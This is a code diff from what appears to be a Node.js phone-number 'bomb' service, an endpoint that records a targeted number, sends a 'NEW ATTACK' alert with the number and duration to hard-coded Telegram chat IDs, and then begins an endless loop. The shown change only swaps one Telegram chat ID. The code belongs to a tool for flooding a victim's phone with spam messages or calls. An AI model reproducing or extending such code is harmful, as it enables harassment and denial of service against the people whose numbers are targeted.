@@ -144,7 +144,7 @@ app.get("/bomb", async (req, res) => {
     numberspamed[number] = true;
 
     const message = `𝗨𝗦𝗘𝗥 𝗨𝗣𝗗𝗔𝗧𝗘𝗦 𝗡𝗘𝗪 𝗔𝗧𝗧𝗔𝗖𝗞\n\n\nNumber: ${number}\nSeconds: ${seconds}`;
-    const chatIds = ['8193991666', '-1002559344724'];
+    const chatIds = ['8193991666', '-1002570468130'];
     await sendTelegramMessage(message, chatIds);
 
     while (true) {
